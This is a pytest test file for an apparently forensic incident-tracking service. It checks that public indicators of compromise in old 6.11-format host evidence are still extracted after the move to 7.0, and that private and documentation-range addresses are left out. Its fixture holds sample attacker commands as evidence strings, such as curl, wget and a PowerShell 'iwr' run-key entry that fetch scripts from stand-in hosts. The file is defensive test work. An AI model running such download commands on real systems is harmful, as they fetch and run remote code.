"""What an incident named in its old host evidence (6.11 shapes) is still named after the move to 7.0."""

from __future__ import annotations

from fastapi.testclient import TestClient
from sqlalchemy import select

from app.core.db import SessionLocal
from app.core.models import FoundIndicator
from app.main import app as fastapi_app
from tests.conftest import make_key

T = 1_700_000_000_000


def document_of_6_11() -> dict:
    """Host evidence as 6.11 kept it in ``data``, with public and private values in each kind."""
    events = [
        {
            "id": f"evt:Security:{n}",
            "time": T + n,
            "eventId": 4624,
            "channel": "Security",
            "provider": "Microsoft-Windows-Security-Auditing",
            "computer": "WKS-042",
            "recordId": n,
            "level": 0,
            "data": {"TargetUserName": "admin", "IpAddress": address},
        }
        for n, address in enumerate(("10.0.0.7", "45.155.205.233", "192.168.1.20"), start=1)
    ]
    events.append(
        {
            "id": "evt:Sysmon:9",
            "time": T + 9,
            "eventId": 3,
            "channel": "Sysmon",
            "provider": "Sysmon",
            "computer": "WKS-042",
            "recordId": 9,
            "level": 4,
            "data": {"DestinationHostname": "c2.badhost-example.net", "CommandLine": "curl http://104.21.5.9/x"},
        }
    )
    return {
        "name": "6.11 evidence",
        "host": "WKS-042",
        "os": "Windows",
        "data": {
            "eventlogs": {"channels": {"Security": {"events": events, "meta": {"fileName": "all.evtx"}}}},
            "browser": {
                "browsers": {
                    "chrome": {
                        "profiles": {
                            "default": {
                                "id": "default",
                                "name": "Default",
                                "history": [
                                    {"id": "h1", "url": "https://phish.badhost-example.org/login", "visitTime": T},
                                    {"id": "h2", "url": "http://10.0.0.5/intranet", "visitTime": T},
                                ],
                                "downloads": [
                                    {
                                        "id": "d1",
                                        "fileName": "a.exe",
                                        "url": "http://185.220.101.4/a.exe",
                                        "referrer": "https://dropper.badhost-example.io/",
                                        "startTime": T,
                                    }
                                ],
                                "bookmarks": [],
                                "shortcuts": [],
                            }
                        }
                    }
                }
            },
            "endpoint": {
                "categories": {
                    "persistence": {
                        "sources": {
                            "runkeys": {
                                "records": [
                                    {
                                        "id": "e1",
                                        "time": None,
                                        "fields": {"name": "Upd", "command": "powershell iwr http://91.92.240.8/p.ps1"},
                                    }
                                ],
                                "meta": {"fileName": "runkeys.csv"},
                            }
                        }
                    }
                }
            },
            "commands": {
                "shells": {
                    "bash": {
                        "commands": [
                            {"id": "c1", "command": "wget https://evil.badhost-example.com/x.sh", "lineNo": 1},
                            {"id": "c2", "command": "ssh root@172.16.4.4", "lineNo": 2},
                            {"id": "c3", "command": "ping 8.8.4.4", "lineNo": 3},
                        ],
                        "meta": {"history": {"fileName": ".bash_history"}},
                    }
                }
            },
        },
    }


def test_public_indicators_of_the_old_host_evidence_stay_and_private_ones_are_left_out(admin):
    client = TestClient(fastapi_app)
    key = make_key(admin, roles=["analyst"])
    assert client.post("/api/incidents", headers=key, json={"id": "old-611", **document_of_6_11()}).status_code == 201
    with SessionLocal() as db:
        found = {
            (row.type, row.value)
            for row in db.scalars(select(FoundIndicator).where(FoundIndicator.incident_id == "old-611"))
        }
    assert {
        ("ip", "45.155.205.233"),  # event log, a field 6.11 read
        ("domain", "c2.badhost-example.net"),
        ("ip", "104.21.5.9"),
        ("domain", "phish.badhost-example.org"),  # visited
        ("url", "http://185.220.101.4/a.exe"),  # downloaded
        ("ip", "185.220.101.4"),
        ("domain", "dropper.badhost-example.io"),  # the referrer
        ("ip", "91.92.240.8"),  # endpoint field
        ("domain", "evil.badhost-example.com"),  # command
        ("url", "https://evil.badhost-example.com/x.sh"),
    } <= found
    # Private addresses were listed by the 6.11 index; 7.0 leaves them out, by the setting both had.
    assert not {value for kind, value in found if kind == "ip" and value.startswith(("10.", "192.168.", "172.16."))}


def test_addresses_of_the_documentation_ranges_are_not_public_and_are_left_out_like_private_ones(admin):
    # 6.11 listed every value of the document; 7.0 reads them with the setting that leaves out what is not public.
    client = TestClient(fastapi_app)
    key = make_key(admin, roles=["analyst"])
    body = document_of_6_11()
    body["data"]["commands"]["shells"]["bash"]["commands"] = [{"id": "c9", "command": "curl http://203.0.113.5/x"}]
    assert client.post("/api/incidents", headers=key, json={"id": "old-doc", **body}).status_code == 201
    with SessionLocal() as db:
        found = {
            (row.type, row.value)
            for row in db.scalars(select(FoundIndicator).where(FoundIndicator.incident_id == "old-doc"))
        }
    assert ("ip", "203.0.113.5") not in found and ("ip", "45.155.205.233") in found
